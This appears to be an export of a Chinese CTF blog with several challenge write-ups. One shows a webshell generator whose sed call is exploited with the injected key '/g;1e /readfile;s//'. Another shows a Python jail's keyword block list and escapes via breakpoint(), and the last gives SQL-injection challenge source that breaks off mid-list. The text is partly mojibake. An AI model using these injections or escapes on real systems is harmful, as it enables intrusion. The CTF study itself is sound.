        <span class="token punctuation">&#125;</span>

        <span class="token selector">input[type="text"],
        select</span> <span class="token punctuation">&#123;</span>
            <span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>
            <span class="token property">padding</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>
            <span class="token property">border-radius</span><span class="token punctuation">:</span> 5px<span class="token punctuation">;</span>
            <span class="token property">border</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
            <span class="token property">margin-bottom</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>
            <span class="token property">box-sizing</span><span class="token punctuation">:</span> border-box<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token selector">input[type="submit"]</span> <span class="token punctuation">&#123;</span>
            <span class="token property">background-color</span><span class="token punctuation">:</span> #4CAF50<span class="token punctuation">;</span>
            <span class="token property">color</span><span class="token punctuation">:</span> #fff<span class="token punctuation">;</span>
            <span class="token property">border</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
            <span class="token property">padding</span><span class="token punctuation">:</span> 10px 20px<span class="token punctuation">;</span>
            <span class="token property">border-radius</span><span class="token punctuation">:</span> 5px<span class="token punctuation">;</span>
            <span class="token property">cursor</span><span class="token punctuation">:</span> pointer<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token selector">input[type="submit"]:hover</span> <span class="token punctuation">&#123;</span>
            <span class="token property">background-color</span><span class="token punctuation">:</span> #3e8e41<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Webshellç”Ÿæˆå™¨<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>language<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Webshellè¯­è¨€ï¼š<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>language<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>method<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>PHP<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>PHP<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>PHP<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>PHP<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>PHP<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>PHP<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>PHP<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>PHP<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>PHP<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>PHP<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>method<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>è¯·æ±‚æ–¹æ³•ï¼š<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>method<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>method<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>POST<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>GET<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>GET<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>REQUEST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>REQUEST<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>key<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>å¯†é’¥ï¼š<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>key<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>114<span class="token punctuation">"</span></span> <span class="token attr-name">pattern</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>[A-Za-z0-9]+<span class="token punctuation">"</span></span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ä½ çš„keyå¤ªå¤æ‚äº†ï¼ç®€å•ç‚¹ï¼o.O<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>filename<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Webshellæ–‡ä»¶åç§°ï¼š<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>filename<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>webshell.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ç”Ÿæˆä½ çš„ä¸“å±Webshellï¼<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>download.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: application/octet-stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Disposition: attachment; filename=<span class="token interpolation"><span class="token variable">$filename</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>generate.sh</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>

<span class="token builtin class-name">set</span> <span class="token parameter variable">-e</span>

<span class="token assign-left variable">NEW_FILENAME</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">tr</span> <span class="token parameter variable">-dc</span> a-z0-9 <span class="token operator">&lt;</span>/dev/urandom <span class="token operator">|</span> <span class="token function">head</span> <span class="token parameter variable">-c</span> <span class="token number">16</span><span class="token variable">)</span></span>
<span class="token function">cp</span> template.php <span class="token string">"/tmp/<span class="token variable">$NEW_FILENAME</span>"</span>
<span class="token builtin class-name">cd</span> /tmp

<span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">"s/KEY/<span class="token variable">$KEY</span>/g"</span> <span class="token string">"<span class="token variable">$NEW_FILENAME</span>"</span>
<span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">"s/METHOD/<span class="token variable">$METHOD</span>/g"</span> <span class="token string">"<span class="token variable">$NEW_FILENAME</span>"</span>

realpath <span class="token string">"<span class="token variable">$NEW_FILENAME</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¿™ä¸ªæ–‡ä»¶çœ‹å‡º<code>$KEY</code>å’Œ<code>$METHOD</code>å‚æ•°å¯æ§ï¼Œé‚£ä¹ˆå¯ä»¥åˆ©ç”¨è¿™é‡Œæ¥å¾—åˆ°flagã€‚<br>è¿™é‡Œå°†å…¶æå‰é—­åˆï¼Œå¯å°†<code>$KEY</code>èµ‹å€¼ä¸º<code>/g</code>ï¼Œç„¶åeå‚æ•°å¯ä»¥æ‰§è¡Œå‘½ä»¤<br><code>sed -i &quot;s/KEY//g;1e /readfile;//&quot; &quot;$NEW_FILENAME&quot;</code><br><code>s/KEY//g;</code>ä¼šæŠŠKEYç½®ç©ºï¼Œå°†ä¸Šé¢çš„å‘½ä»¤è¿›è¡Œé—­åˆå³å¯<br><code>sed -i &quot;s/KEY//g;1e /readfile;s//&quot; &quot;$NEW_FILENAME&quot;</code><br>é‚£ä¹ˆkeyåªéœ€ä¼ å…¥<code>/g;1e /readfile;s//</code><br><img src="https://img-blog.csdnimg.cn/direct/b3bfc0ece8bd4f82957c6e4b4a362870.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/direct/2bb8f44e6b6d4d2a8b5b6c35bdc0612c.png" alt="456"></p>
]]></content>
      <categories>
        <category>èµ›äº‹WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>niteCTF-2023-MISC</title>
    <url>/2023/12/21/niteCTF-2023-MISC/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="blindjail"><a href="#blindjail" class="headerlink" title="blindjail"></a>blindjail</h2><p>ncè¿æ¥é¢˜ç›®ï¼Œä¹Ÿæ²¡æœ‰æºç <br><img src="https://img-blog.csdnimg.cn/direct/965af19a6dbf4a0eaa03b21e89043b44.png" alt="123"><br>çœ‹èµ·æ¥åƒæ˜¯pythonç»ˆç«¯ï¼Œè¦è¿›è¡Œå‘½ä»¤æ‰§è¡Œæ—¶å‘ç°importè¢«ç¦äº†<br>åœ¨è¿™é‡Œäº†è§£åˆ°pythonä¸­çš„ä¸€ä¸ªå‡½æ•°<strong>breakpoint()</strong><br><img src="https://img-blog.csdnimg.cn/direct/c3de4eefccdd4c1f9af07b920b7b4f41.png" alt="12"><br>é‚£ä¹ˆè¿™é‡Œå°±ä½¿ç”¨è¿™ä¸ªå‡½æ•°å°è¯•ä¸€ä¸‹<br><img src="https://img-blog.csdnimg.cn/direct/ee933b91579b454590e5e63f8cd88dba.png" alt="456"><br>å½“ç„¶è¿˜å¯ä»¥ä½¿ç”¨å…¨è§’å­—ç¬¦ç»•è¿‡<br><img src="https://img-blog.csdnimg.cn/direct/c6cc0ea01d334648b1f6e1eeeef9801b.png" alt="132"></p>
<p>è¶æœºå·ä¸€ä¸‹æºç ğŸ˜</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># main.py</span>
<span class="token comment"># print(getattr("".__class__.___mro___.__subclasses__()[108])().load_module("\x6f\x73"),"")</span>
<span class="token comment"># subclasses = "".__class__.__mro__[1].__subclasses__()</span>
<span class="token comment"># print("Subclasses:", subclasses)</span>


<span class="token keyword">def</span> <span class="token function">checker</span><span class="token punctuation">(</span>inp<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># a = inp  # f'flag'+ inp</span>
    <span class="token comment"># print(a)</span>
    <span class="token comment"># redact the keyword lists</span>

    <span class="token keyword">for</span> keyword <span class="token keyword">in</span> <span class="token punctuation">[</span>
        <span class="token string">"eval"</span><span class="token punctuation">,</span>
        <span class="token string">"exec"</span><span class="token punctuation">,</span>
        <span class="token string">"import"</span><span class="token punctuation">,</span>
        <span class="token string">"open"</span><span class="token punctuation">,</span>
        <span class="token string">"os"</span><span class="token punctuation">,</span>
        <span class="token string">"read"</span><span class="token punctuation">,</span>
        <span class="token string">"system"</span><span class="token punctuation">,</span>
        <span class="token string">"write"</span><span class="token punctuation">,</span>
        <span class="token string">"subprocess"</span><span class="token punctuation">,</span>
        <span class="token string">"str"</span><span class="token punctuation">,</span>
        <span class="token string">"flag"</span><span class="token punctuation">,</span>
        <span class="token string">"import"</span><span class="token punctuation">,</span>
        <span class="token string">"cat"</span><span class="token punctuation">,</span>
        <span class="token string">"63"</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> keyword <span class="token keyword">in</span> inp<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f" Nope,  </span><span class="token interpolation"><span class="token punctuation">&#123;</span>keyword<span class="token punctuation">&#125;</span></span><span class="token string">  is banned! "</span></span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        o <span class="token operator">=</span> <span class="token keyword">exec</span><span class="token punctuation">(</span>inp<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> o <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span>


<span class="token keyword">print</span><span class="token punctuation">(</span>
    <span class="token string">"------------------------------------------------------------- \n WELCOME TO THE BLINDJAIL \n --------------------------------------------------------\n "</span>
    <span class="token string">"\x1B[3m fret not that you cannot see, fret that you cannot leave.\x1B[0m "</span>
<span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        inp <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">">>> "</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> inp<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"exit"</span><span class="token punctuation">:</span>
            <span class="token keyword">break</span>
        checker<span class="token punctuation">(</span>inp<span class="token punctuation">)</span>
    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nBye!"</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>
    <span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nBye!"</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>
    <span class="token keyword">except</span> BaseException <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"look for the light! \n"</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span>args<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="DecryptaQuest"><a href="#DecryptaQuest" class="headerlink" title="DecryptaQuest"></a>DecryptaQuest</h2><p>ç»™äº†ä¸€ä¸ªæµé‡åŒ…<a href="https://github.com/daffainfo/ctf-writeup/blob/main/niteCTF%202023/DecryptaQuest/Decryta_logs.pcapng">Decryta_logs.pcapng</a><br>å­˜åœ¨ä¸€äº›æœªè§£å¯†çš„tlsæµé‡åŒ…ï¼Œæ‰“å¼€ä¹‹åç»è¿‡ä¸€ç•ªæŸ¥æ‰¾æ‰¾åˆ°ä¸€æ®µbase64å¯†æ–‡ï¼Œä½¿ç”¨cyberè§£ç ä¸€ä¸‹<br><img src="https://img-blog.csdnimg.cn/direct/0af975aab3d548998d6ee631e4854276.png" alt="123"><br>é€šè¿‡ä¸€ä¸‹å†…å®¹çœ‹å‡ºæ˜¯SSLKEYLOGFILE</p>
<blockquote>
<p>CLIENT_HANDSHAKE_TRAFFIC_SECRET<br>CLIENT_HANDSHAKE_TRAFFIC_SECRET<br>CLIENT_TRAFFIC_SECRET_0<br>SERVER_TRAFFIC_SECRET_0<br>EXPORTER_SECRET<br><img src="https://img-blog.csdnimg.cn/direct/b24592424660498e96c923ee6ab0120e.png" alt="456"></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/direct/afe378d07d7f4d5692ff45e0e646402c.png" alt="456"><br>ç°åœ¨å°†SSLKEYLOGFILEå¯¼å‡ºä¿å­˜ç„¶åå†å¯¼å…¥åˆ°wiresharkä¸­<br>ç¼–è¾‘-&gt;é¦–é€‰é¡¹-&gt;Protocols-&gt;TLS<br><img src="https://img-blog.csdnimg.cn/direct/c20137bdfbd64513bdda2b913e922398.png" alt="123"><br>ç„¶åè¿‡æ»¤httpæµé‡<br><img src="https://img-blog.csdnimg.cn/direct/a613499b2c0c48a99f2e92576ab0920d.png" alt="132"></p>
]]></content>
      <categories>
        <category>èµ›äº‹WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>niteCTF-2023-Image-Gallery-wirteup</title>
    <url>/2023/12/20/niteCTF-2023-Image-Gallery-wirteup/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="è€ƒç‚¹"><a href="#è€ƒç‚¹" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h2><p>SQLæ³¨å…¥ç»•è¿‡ï¼Œjsåæ··æ·†</p>
<h2 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h2><p>é¢˜ç›®ç»™äº†æºä»£ç å¦‚ä¸‹<br><strong>main.py</strong></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> session
<span class="token keyword">import</span> sqlite3
<span class="token keyword">import</span> uuid

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">,</span> <span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">"logged_in"</span> <span class="token keyword">in</span> session <span class="token keyword">and</span> session<span class="token punctuation">[</span><span class="token string">"logged_in"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">"logged_in"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>
        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>
        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span>
        loweruser <span class="token operator">=</span> username<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
        lowerpass <span class="token operator">=</span> password<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
        invalid_entries <span class="token operator">=</span> invalid_entries <span class="token operator">=</span> <span class="token punctuation">[</span>
            <span class="token string">"="</span><span class="token punctuation">,</span>
            <span class="token string">"&lt;"</span><span class="token punctuation">,</span>
            <span class="token string">">"</span><span class="token punctuation">,</span>
            <span class="token string">"+"</span><span class="token punctuation">,</span>
            <span class="token string">"//"</span><span class="token punctuation">,</span>
            <span class="token string">"|"</span><span class="token punctuation">,</span>
            <span class="token string">";"</span><span class="token punctuation">,</span>
            <span class="token string">" "</span><span class="token punctuation">,</span>
            <span class="token string">" "</span><span class="token punctuation">,</span>
            <span class="token string">"'1"</span><span class="token punctuation">,</span>
            <span class="token string">" 1"</span><span class="token punctuation">,</span>
            <span class="token string">" true"</span><span class="token punctuation">,</span>
            <span class="token string">"'true"</span><span class="token punctuation">,</span>
            <span class="token string">" or"</span><span class="token punctuation">,</span>
            <span class="token string">"'or"</span><span class="token punctuation">,</span>
